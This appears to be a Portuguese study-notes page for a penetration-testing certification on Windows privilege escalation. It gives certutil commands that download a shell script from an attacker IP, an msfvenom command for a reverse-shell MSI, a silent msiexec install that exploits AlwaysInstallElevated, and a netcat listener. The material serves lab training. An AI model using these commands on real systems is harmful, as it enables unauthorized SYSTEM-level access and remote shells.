> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/windows-privilege-escalation/miscellaneous-techniques.md).

# Miscellaneous Techniques

#### Vivendo da Terra: Binários e Scripts (LOLBAS) <a href="#living-off-the-land-binaries-and-scripts-lolbas" id="living-off-the-land-binaries-and-scripts-lolbas"></a>

O [projeto LOLBAS](https://lolbas-project.github.io/) documenta binários, scripts e bibliotecas que podem ser usados ​​para técnicas de "aproveitamento de recursos" em sistemas Windows. Cada um desses binários, scripts e bibliotecas é um arquivo assinado pela Microsoft, nativo do sistema operacional ou que pode ser baixado diretamente da Microsoft e possui funcionalidades inesperadas úteis para um atacante.&#x20;

* **Transferindo arquivos com Certutil**

```ps
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

* Podemos usar a `-encode`flag para codificar um arquivo usando base64 em nosso host de ataque Windows e copiar o conteúdo para um novo arquivo no sistema remoto.

```ps
certutil -encode file1 encodedfile
```

* Após a criação do novo arquivo, podemos usar o `-decode`sinalizador para decodificá-lo e restaurar seu conteúdo original.

```ps
certutil -decode encodedfile file2
```

#### Always Install Elevated <a href="#always-install-elevated" id="always-install-elevated"></a>

Essa configuração pode ser definida por meio da Política de Grupo Local, configurando `Always install with elevated privileges`-a `Enabled`nos seguintes caminhos.

* `Computer Configuration\Administrative Templates\Windows Components\Windows Installer`
* `User Configuration\Administrative Templates\Windows Components\Windows Installer`

**Enumerating Always Install Elevated Settings**

```ps
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

**Gerando pacote MSI**

* Podemos explorar isso gerando um `MSI`pacote malicioso e executando-o através da linha de comando para obter um shell reverso com privilégios de SYSTEM.

```ps
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

* Podemos enviar este arquivo MSI para o nosso destino, iniciar um ouvinte Netcat e executar o arquivo a partir da linha de comando da seguinte forma:

```ps
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

* Se tudo correr conforme o planejado, receberemos uma conexão de volta como `NT AUTHORITY\SYSTEM`.

```ps
nc -lnvp 9443
```

**Enumerando tarefas agendadas**&#x20;

```
schtasks /query /fo LIST /v
```
